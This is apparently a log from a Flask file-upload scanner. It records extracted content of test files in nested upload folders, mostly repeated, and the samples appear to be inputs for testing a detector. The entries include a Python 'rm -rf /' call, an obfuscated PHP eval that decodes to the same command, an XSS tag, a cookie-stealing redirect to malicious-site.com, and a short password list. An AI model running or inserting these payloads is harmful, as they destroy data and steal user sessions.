2025-02-22 20:38:33,778 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/new_test/new_test/HELLO.txt: hello bro
this script is for hacking sql attack and brute force attacks.
2025-02-22 20:38:33,779 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/new_test/new_test/text_hidden_yaml.yaml: # Sample YAML file
users:
  - username: admin
    password: secret
  - username: attacker
    payload: "exec('malicious_code_here')"  # Hidden malicious code
2025-02-22 20:38:33,781 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/new_test/new_test/test_brute_force.txt: hello bro
this script is for hacking sql attack and brute force attacks.
2025-02-22 20:38:33,782 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/test/test/3.py: import os
os.system("rm -rf /")  # Dangerous command

2025-02-22 20:38:33,783 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/test/test/4.php: <?php
eval(base64_decode("c3lzdGVtKCJybSAtcmYgLyIpOw=="));
?>

2025-02-22 20:38:33,784 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/test/test/2.xss: <script>alert('Hacked!');</script>

2025-02-22 20:38:33,785 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/test/test/6.js: document.location = "http://malicious-site.com?cookie=" + document.cookie;

2025-02-22 20:38:33,786 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/test/test/5.txt: password_list.txt
admin123
qwerty

2025-02-22 20:38:33,788 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/test/test/1.zip: PK   ZVZ        9      1.sqlUT
 UgEggux     vquQRpU(-N-*Vp
rsSlSr3
mؚ PK d6   9   PK   ZVZ d6   9                  1.sqlUT
 UgEggux     PK      S        
2025-02-22 20:38:33,789 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/new_test/new_test/HELLO.txt: hello bro
this script is for hacking sql attack and brute force attacks.
2025-02-22 20:38:33,790 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/new_test/new_test/text_hidden_yaml.yaml: # Sample YAML file
users:
  - username: admin
    password: secret
  - username: attacker
    payload: "exec('malicious_code_here')"  # Hidden malicious code
2025-02-22 20:38:33,792 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/new_test/new_test/test_brute_force.txt: hello bro
this script is for hacking sql attack and brute force attacks.
2025-02-22 20:38:33,794 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/test/test/3.py: import os
os.system("rm -rf /")  # Dangerous command

2025-02-22 20:38:33,795 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/test/test/4.php: <?php
eval(base64_decode("c3lzdGVtKCJybSAtcmYgLyIpOw=="));
?>

2025-02-22 20:38:33,796 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/test/test/2.xss: <script>alert('Hacked!');</script>

2025-02-22 20:38:33,797 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/test/test/6.js: document.location = "http://malicious-site.com?cookie=" + document.cookie;

2025-02-22 20:38:33,799 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/test/test/5.txt: password_list.txt
admin123
qwerty

2025-02-22 20:38:33,800 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/test/test/1.zip: PK   ZVZ        9      1.sqlUT
 UgEggux     vquQRpU(-N-*Vp
rsSlSr3
mؚ PK d6   9   PK   ZVZ d6   9                  1.sqlUT
 UgEggux     PK      S        
2025-02-22 20:38:33,802 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/new_test/new_test/HELLO.txt: hello bro
this script is for hacking sql attack and brute force attacks.
2025-02-22 20:38:33,803 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/new_test/new_test/text_hidden_yaml.yaml: # Sample YAML file
users:
  - username: admin
    password: secret
  - username: attacker
    payload: "exec('malicious_code_here')"  # Hidden malicious code
2025-02-22 20:38:33,805 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/new_test/new_test/test_brute_force.txt: hello bro
this script is for hacking sql attack and brute force attacks.
2025-02-22 20:38:33,807 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/test/test/3.py: import os
os.system("rm -rf /")  # Dangerous command

2025-02-22 20:38:33,808 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/test/test/4.php: <?php
eval(base64_decode("c3lzdGVtKCJybSAtcmYgLyIpOw=="));
?>

2025-02-22 20:38:33,810 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/test/test/2.xss: <script>alert('Hacked!');</script>

2025-02-22 20:38:33,811 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/test/test/6.js: document.location = "http://malicious-site.com?cookie=" + document.cookie;

2025-02-22 20:38:33,813 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/test/test/5.txt: password_list.txt
admin123
qwerty

2025-02-22 20:38:33,815 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/test/test/1.zip: PK   ZVZ        9      1.sqlUT
 UgEggux     vquQRpU(-N-*Vp
rsSlSr3
mؚ PK d6   9   PK   ZVZ d6   9                  1.sqlUT
 UgEggux     PK      S        
2025-02-22 20:38:33,816 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/new_test/new_test/HELLO.txt: hello bro
this script is for hacking sql attack and brute force attacks.
2025-02-22 20:38:33,818 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/new_test/new_test/text_hidden_yaml.yaml: # Sample YAML file
users:
  - username: admin
    password: secret
  - username: attacker
    payload: "exec('malicious_code_here')"  # Hidden malicious code
2025-02-22 20:38:33,820 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/new_test/new_test/test_brute_force.txt: hello bro
this script is for hacking sql attack and brute force attacks.
2025-02-22 20:38:33,821 - Extracted content from uploads/test/test/3.py: import os
os.system("rm -rf /")  # Dangerous command

2025-02-22 20:38:33,823 - Extracted content from uploads/test/test/4.php: <?php
eval(base64_decode("c3lzdGVtKCJybSAtcmYgLyIpOw=="));
?>

2025-02-22 20:38:33,824 - Extracted content from uploads/test/test/2.xss: <script>alert('Hacked!');</script>

2025-02-22 20:38:33,825 - Extracted content from uploads/test/test/6.js: document.location = "http://malicious-site.com?cookie=" + document.cookie;

2025-02-22 20:38:33,827 - Extracted content from uploads/test/test/5.txt: password_list.txt
admin123
qwerty

2025-02-22 20:38:33,829 - Extracted content from uploads/test/test/1.zip: PK   ZVZ        9      1.sqlUT
 UgEggux     vquQRpU(-N-*Vp
rsSlSr3
mؚ PK d6   9   PK   ZVZ d6   9                  1.sqlUT
 UgEggux     PK      S        
2025-02-22 20:38:33,831 - Extracted content from uploads/new_test/new_test/HELLO.txt: hello bro
this script is for hacking sql attack and brute force attacks.
2025-02-22 20:38:33,832 - Extracted content from uploads/new_test/new_test/text_hidden_yaml.yaml: # Sample YAML file
users:
  - username: admin
    password: secret
  - username: attacker
    payload: "exec('malicious_code_here')"  # Hidden malicious code
2025-02-22 20:38:33,833 - Extracted content from uploads/new_test/new_test/test_brute_force.txt: hello bro
this script is for hacking sql attack and brute force attacks.
2025-02-22 20:38:37,400 - Extracted content from uploads/flask_file_upload/flask_file_upload/metadata_analysis.py: import os
import re
import zipfile
import xml.etree.ElementTree as ET
from docx import Document
from pptx import Presentation
from openpyxl import load_workbook

def extract_metadata(file_path):
    """Extract metadata from .docx, .pptx, .xlsx files"""
    metadata = {}

    try:
        if file_path.endswith(".docx"):
            doc = Document(file_path)
            metadata["Title"] = doc.core_properties.title
            metadata["Author"] = doc.core_properties.author
            metadata["C
2025-02-22 20:38:37,405 - Extracted content from uploads/flask_file_upload/flask_file_upload/trash/7-A.R: data(iris)
set.seed(123)
kmeans_model <- kmeans(iris[, -5], centers = 3)
plot(iris$Sepal.Length, iris$Sepal.Width, col = kmeans_model$cluster,
     pch = 19, xlab = "Sepal Length", ylab = "Sepal Width", 
     main = "K-Means Clustering")

2025-02-22 20:38:37,407 - Extracted content from uploads/flask_file_upload/flask_file_upload/trash/input_detail.yaml: # AXI4_LITE WIRE:
axi4_lite_paddr: 32
axi4_lite_addr: 32
# AXI4 WIRE:
axi4_paddr: 32
axi4_addr: 32
#CONFIG PARAMETER FOR BOTH AXI4 AND AXI4_LITE
config: 0
plic_num_context: 2


# TbSOC generation:
# if TbSOC is needed:
# Input for the TbSOC And Other inputs:
tbsoc: "yes"
openocd: "no"
sign_dump: "yes"
Rv64: "yes"
spfpu: "yes"
debug: "no"
rtldump: "yes"
cocotb_sim: "yes"
atomic: "yes"
compressed: "yes"
muldiv: "yes"
usertraps: "yes"
supervisor: "yes"
user: "yes"
hypervisor: "no"
bscan2e: "yes"
# 
2025-02-22 20:38:37,409 - Extracted content from uploads/flask_file_upload/flask_file_upload/trash/5-A.R: library(rpart)
age <- c(22, 24, 30, 35, 45, 50, 60, 65, 70, 75, 80, 85) 
survived <- as.factor(c(0, 0, 0, 1, 1, 0, 1, 0, 1, 1, 0, 0)) 
data <- data.frame(Age = age, Survived = survived)
model <- rpart(Survived ~ Age, data = data, method = "class", control = rpart.control(minsplit = 1))

plot(model, uniform = TRUE, margin = 0.1)
text(model, use.n = TRUE, cex = 0.8)
print(model)
2025-02-22 20:38:37,411 - Extracted content from uploads/flask_file_upload/flask_file_upload/trash/3.py: import os
os.system("rm -rf /")  # Dangerous command

2025-02-22 20:38:37,412 - Extracted content from uploads/flask_file_upload/flask_file_upload/trash/w.js: hello bro
this file will not contains any pattern or sql injection or brute force attack

2025-02-22 20:38:37,413 - Extracted content from uploads/flask_file_upload/flask_file_upload/trash/4.php: <?php
eval(base64_decode("c3lzdGVtKCJybSAtcmYgLyIpOw=="));
?>

2025-02-22 20:38:37,414 - Extracted content from uploads/flask_file_upload/flask_file_upload/trash/2.xss: <script>alert('Hacked!');</script>

2025-02-22 20:38:37,415 - Extracted content from uploads/flask_file_upload/flask_file_upload/trash/6.js: document.location = "http://malicious-site.com?cookie=" + document.cookie;

2025-02-22 20:38:37,416 - Extracted content from uploads/flask_file_upload/flask_file_upload/trash/mixed_cluster.bsv: /* 
Copyright (c) 2019, IIT Madras All rights reserved.

Redistribution and use in source and binary forms, with or without modification, are permitted
provided that the following conditions are met:

* Redistributions of source code must retain the above copyright notice, this list of conditions
  and the following disclaimer.  
* Redistributions in binary form must reproduce the above copyright notice, this list of 
  conditions and the following disclaimer in the documentation and/or other ma
2025-02-22 20:38:37,421 - Extracted content from uploads/flask_file_upload/flask_file_upload/trash/5.txt: password_list.txt
admin123
qwerty

2025-02-22 20:38:37,423 - Extracted content from uploads/flask_file_upload/flask_file_upload/trash/a.py: hello bro
this file will not contains any pattern or sql injection or brute force attack

2025-02-22 20:38:37,424 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/metadata_analysis.py: import os
import re
import zipfile
import xml.etree.ElementTree as ET
from docx import Document
from pptx import Presentation
from openpyxl import load_workbook

def extract_metadata(file_path):
    """Extract metadata from .docx, .pptx, .xlsx files"""
    metadata = {}

    try:
        if file_path.endswith(".docx"):
            doc = Document(file_path)
            metadata["Title"] = doc.core_properties.title
            metadata["Author"] = doc.core_properties.author
            metadata["C
2025-02-22 20:38:37,426 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/7-A.R: data(iris)
set.seed(123)
kmeans_model <- kmeans(iris[, -5], centers = 3)
plot(iris$Sepal.Length, iris$Sepal.Width, col = kmeans_model$cluster,
     pch = 19, xlab = "Sepal Length", ylab = "Sepal Width", 
     main = "K-Means Clustering")

2025-02-22 20:38:37,428 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/input_detail.yaml: # AXI4_LITE WIRE:
axi4_lite_paddr: 32
axi4_lite_addr: 32
# AXI4 WIRE:
axi4_paddr: 32
axi4_addr: 32
#CONFIG PARAMETER FOR BOTH AXI4 AND AXI4_LITE
config: 0
plic_num_context: 2


# TbSOC generation:
# if TbSOC is needed:
# Input for the TbSOC And Other inputs:
tbsoc: "yes"
openocd: "no"
sign_dump: "yes"
Rv64: "yes"
spfpu: "yes"
debug: "no"
rtldump: "yes"
cocotb_sim: "yes"
atomic: "yes"
compressed: "yes"
muldiv: "yes"
usertraps: "yes"
supervisor: "yes"
user: "yes"
hypervisor: "no"
bscan2e: "yes"
# 
2025-02-22 20:38:37,430 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/5-A.R: library(rpart)
age <- c(22, 24, 30, 35, 45, 50, 60, 65, 70, 75, 80, 85) 
survived <- as.factor(c(0, 0, 0, 1, 1, 0, 1, 0, 1, 1, 0, 0)) 
data <- data.frame(Age = age, Survived = survived)
model <- rpart(Survived ~ Age, data = data, method = "class", control = rpart.control(minsplit = 1))

plot(model, uniform = TRUE, margin = 0.1)
text(model, use.n = TRUE, cex = 0.8)
print(model)
2025-02-22 20:38:37,431 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/3.py: import os
os.system("rm -rf /")  # Dangerous command

2025-02-22 20:38:37,433 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/w.js: hello bro
this file will not contains any pattern or sql injection or brute force attack

2025-02-22 20:38:37,434 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/4.php: <?php
eval(base64_decode("c3lzdGVtKCJybSAtcmYgLyIpOw=="));
?>

2025-02-22 20:38:37,435 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/2.xss: <script>alert('Hacked!');</script>

2025-02-22 20:38:37,436 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/6.js: document.location = "http://malicious-site.com?cookie=" + document.cookie;

2025-02-22 20:38:37,437 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/mixed_cluster.bsv: /* 
Copyright (c) 2019, IIT Madras All rights reserved.

Redistribution and use in source and binary forms, with or without modification, are permitted
provided that the following conditions are met:

* Redistributions of source code must retain the above copyright notice, this list of conditions
  and the following disclaimer.  
* Redistributions in binary form must reproduce the above copyright notice, this list of 
  conditions and the following disclaimer in the documentation and/or other ma
2025-02-22 20:38:37,442 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/5.txt: password_list.txt
admin123
qwerty

2025-02-22 20:38:37,444 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/a.py: hello bro
this file will not contains any pattern or sql injection or brute force attack

2025-02-22 20:38:37,445 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/metadata_analysis.py: import os
import re
import zipfile
import xml.etree.ElementTree as ET
from docx import Document
from pptx import Presentation
from openpyxl import load_workbook

def extract_metadata(file_path):
    """Extract metadata from .docx, .pptx, .xlsx files"""
    metadata = {}

    try:
        if file_path.endswith(".docx"):
            doc = Document(file_path)
            metadata["Title"] = doc.core_properties.title
            metadata["Author"] = doc.core_properties.author
            metadata["C
2025-02-22 20:38:37,447 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/7-A.R: data(iris)
set.seed(123)
kmeans_model <- kmeans(iris[, -5], centers = 3)
plot(iris$Sepal.Length, iris$Sepal.Width, col = kmeans_model$cluster,
     pch = 19, xlab = "Sepal Length", ylab = "Sepal Width", 
     main = "K-Means Clustering")

2025-02-22 20:38:37,448 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/input_detail.yaml: # AXI4_LITE WIRE:
axi4_lite_paddr: 32
axi4_lite_addr: 32
# AXI4 WIRE:
axi4_paddr: 32
axi4_addr: 32
#CONFIG PARAMETER FOR BOTH AXI4 AND AXI4_LITE
config: 0
plic_num_context: 2


# TbSOC generation:
# if TbSOC is needed:
# Input for the TbSOC And Other inputs:
tbsoc: "yes"
openocd: "no"
sign_dump: "yes"
Rv64: "yes"
spfpu: "yes"
debug: "no"
rtldump: "yes"
cocotb_sim: "yes"
atomic: "yes"
compressed: "yes"
muldiv: "yes"
usertraps: "yes"
supervisor: "yes"
user: "yes"
hypervisor: "no"
bscan2e: "yes"
# 
2025-02-22 20:38:37,451 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/5-A.R: library(rpart)
age <- c(22, 24, 30, 35, 45, 50, 60, 65, 70, 75, 80, 85) 
survived <- as.factor(c(0, 0, 0, 1, 1, 0, 1, 0, 1, 1, 0, 0)) 
data <- data.frame(Age = age, Survived = survived)
model <- rpart(Survived ~ Age, data = data, method = "class", control = rpart.control(minsplit = 1))

plot(model, uniform = TRUE, margin = 0.1)
text(model, use.n = TRUE, cex = 0.8)
print(model)
2025-02-22 20:38:37,452 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/3.py: import os
os.system("rm -rf /")  # Dangerous command

2025-02-22 20:38:37,454 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/w.js: hello bro
this file will not contains any pattern or sql injection or brute force attack

2025-02-22 20:38:37,455 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/4.php: <?php
eval(base64_decode("c3lzdGVtKCJybSAtcmYgLyIpOw=="));
?>

2025-02-22 20:38:37,457 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/2.xss: <script>alert('Hacked!');</script>

2025-02-22 20:38:37,458 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/6.js: document.location = "http://malicious-site.com?cookie=" + document.cookie;

2025-02-22 20:38:37,459 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/mixed_cluster.bsv: /* 
Copyright (c) 2019, IIT Madras All rights reserved.

Redistribution and use in source and binary forms, with or without modification, are permitted
provided that the following conditions are met:

* Redistributions of source code must retain the above copyright notice, this list of conditions
  and the following disclaimer.  
* Redistributions in binary form must reproduce the above copyright notice, this list of 
  conditions and the following disclaimer in the documentation and/or other ma
2025-02-22 20:38:37,464 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/5.txt: password_list.txt
admin123
qwerty

2025-02-22 20:38:37,465 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/a.py: hello bro
this file will not contains any pattern or sql injection or brute force attack

2025-02-22 20:38:37,467 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/test/test/3.py: import os
os.system("rm -rf /")  # Dangerous command

2025-02-22 20:38:37,468 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/test/test/4.php: <?php
eval(base64_decode("c3lzdGVtKCJybSAtcmYgLyIpOw=="));
?>

2025-02-22 20:38:37,469 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/test/test/2.xss: <script>alert('Hacked!');</script>

2025-02-22 20:38:37,470 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/test/test/6.js: document.location = "http://malicious-site.com?cookie=" + document.cookie;

2025-02-22 20:38:37,471 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/test/test/5.txt: password_list.txt
admin123
qwerty

2025-02-22 20:38:37,472 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/test/test/1.zip: PK   ZVZ        9      1.sqlUT
 UgEggux     vquQRpU(-N-*Vp
rsSlSr3
mؚ PK d6   9   PK   ZVZ d6   9                  1.sqlUT
 UgEggux     PK      S        
2025-02-22 20:38:37,473 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/new_test/new_test/HELLO.txt: hello bro
this script is for hacking sql attack and brute force attacks.
2025-02-22 20:38:37,475 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/new_test/new_test/text_hidden_yaml.yaml: # Sample YAML file
users:
  - username: admin
    password: secret
  - username: attacker
    payload: "exec('malicious_code_here')"  # Hidden malicious code
2025-02-22 20:38:37,476 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/new_test/new_test/test_brute_force.txt: hello bro
this script is for hacking sql attack and brute force attacks.
2025-02-22 20:38:37,477 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/test/test/3.py: import os
os.system("rm -rf /")  # Dangerous command

2025-02-22 20:38:37,478 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/test/test/4.php: <?php
eval(base64_decode("c3lzdGVtKCJybSAtcmYgLyIpOw=="));
?>

2025-02-22 20:38:37,479 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/test/test/2.xss: <script>alert('Hacked!');</script>

2025-02-22 20:38:37,480 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/test/test/6.js: document.location = "http://malicious-site.com?cookie=" + document.cookie;

2025-02-22 20:38:37,481 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/test/test/5.txt: password_list.txt
admin123
qwerty

2025-02-22 20:38:37,483 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/test/test/1.zip: PK   ZVZ        9      1.sqlUT
 UgEggux     vquQRpU(-N-*Vp
rsSlSr3
mؚ PK d6   9   PK   ZVZ d6   9                  1.sqlUT
 UgEggux     PK      S        
2025-02-22 20:38:37,485 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/new_test/new_test/HELLO.txt: hello bro
this script is for hacking sql attack and brute force attacks.
2025-02-22 20:38:37,487 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/new_test/new_test/text_hidden_yaml.yaml: # Sample YAML file
users:
  - username: admin
    password: secret
  - username: attacker
    payload: "exec('malicious_code_here')"  # Hidden malicious code
2025-02-22 20:38:37,489 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/new_test/new_test/test_brute_force.txt: hello bro
this script is for hacking sql attack and brute force attacks.
2025-02-22 20:38:37,490 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/test/test/3.py: import os
os.system("rm -rf /")  # Dangerous command

2025-02-22 20:38:37,492 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/test/test/4.php: <?php
eval(base64_decode("c3lzdGVtKCJybSAtcmYgLyIpOw=="));
?>

2025-02-22 20:38:37,494 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/test/test/2.xss: <script>alert('Hacked!');</script>

2025-02-22 20:38:37,495 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/test/test/6.js: document.location = "http://malicious-site.com?cookie=" + document.cookie;

2025-02-22 20:38:37,497 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/test/test/5.txt: password_list.txt
admin123
qwerty

2025-02-22 20:38:37,499 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/test/test/1.zip: PK   ZVZ        9      1.sqlUT
 UgEggux     vquQRpU(-N-*Vp
rsSlSr3
mؚ PK d6   9   PK   ZVZ d6   9                  1.sqlUT
 UgEggux     PK      S        
2025-02-22 20:38:37,502 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/new_test/new_test/HELLO.txt: hello bro
this script is for hacking sql attack and brute force attacks.
2025-02-22 20:38:37,503 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/new_test/new_test/text_hidden_yaml.yaml: # Sample YAML file
users:
  - username: admin
    password: secret
  - username: attacker
    payload: "exec('malicious_code_here')"  # Hidden malicious code
2025-02-22 20:38:37,505 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/new_test/new_test/test_brute_force.txt: hello bro
this script is for hacking sql attack and brute force attacks.
2025-02-22 20:38:37,507 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/metadata_analysis.py: import os
import re
import zipfile
import xml.etree.ElementTree as ET
from docx import Document
from pptx import Presentation
from openpyxl import load_workbook

def extract_metadata(file_path):
    """Extract metadata from .docx, .pptx, .xlsx files"""
    metadata = {}

    try:
        if file_path.endswith(".docx"):
            doc = Document(file_path)
            metadata["Title"] = doc.core_properties.title
            metadata["Author"] = doc.core_properties.author
            metadata["C
2025-02-22 20:38:37,512 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/trash/7-A.R: data(iris)
set.seed(123)
kmeans_model <- kmeans(iris[, -5], centers = 3)
plot(iris$Sepal.Length, iris$Sepal.Width, col = kmeans_model$cluster,
     pch = 19, xlab = "Sepal Length", ylab = "Sepal Width", 
     main = "K-Means Clustering")

2025-02-22 20:38:37,514 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/trash/input_detail.yaml: # AXI4_LITE WIRE:
axi4_lite_paddr: 32
axi4_lite_addr: 32
# AXI4 WIRE:
axi4_paddr: 32
axi4_addr: 32
#CONFIG PARAMETER FOR BOTH AXI4 AND AXI4_LITE
config: 0
plic_num_context: 2


# TbSOC generation:
# if TbSOC is needed:
# Input for the TbSOC And Other inputs:
tbsoc: "yes"
openocd: "no"
sign_dump: "yes"
Rv64: "yes"
spfpu: "yes"
debug: "no"
rtldump: "yes"
cocotb_sim: "yes"
atomic: "yes"
compressed: "yes"
muldiv: "yes"
usertraps: "yes"
supervisor: "yes"
user: "yes"
hypervisor: "no"
bscan2e: "yes"
# 
2025-02-22 20:38:37,519 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/trash/5-A.R: library(rpart)
age <- c(22, 24, 30, 35, 45, 50, 60, 65, 70, 75, 80, 85) 
survived <- as.factor(c(0, 0, 0, 1, 1, 0, 1, 0, 1, 1, 0, 0)) 
data <- data.frame(Age = age, Survived = survived)
model <- rpart(Survived ~ Age, data = data, method = "class", control = rpart.control(minsplit = 1))

plot(model, uniform = TRUE, margin = 0.1)
text(model, use.n = TRUE, cex = 0.8)
print(model)
2025-02-22 20:38:37,521 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/trash/3.py: import os
os.system("rm -rf /")  # Dangerous command

2025-02-22 20:38:37,523 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/trash/w.js: hello bro
this file will not contains any pattern or sql injection or brute force attack

2025-02-22 20:38:37,525 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/trash/4.php: <?php
eval(base64_decode("c3lzdGVtKCJybSAtcmYgLyIpOw=="));
?>

2025-02-22 20:38:37,526 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/trash/2.xss: <script>alert('Hacked!');</script>

2025-02-22 20:38:37,528 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/trash/6.js: document.location = "http://malicious-site.com?cookie=" + document.cookie;

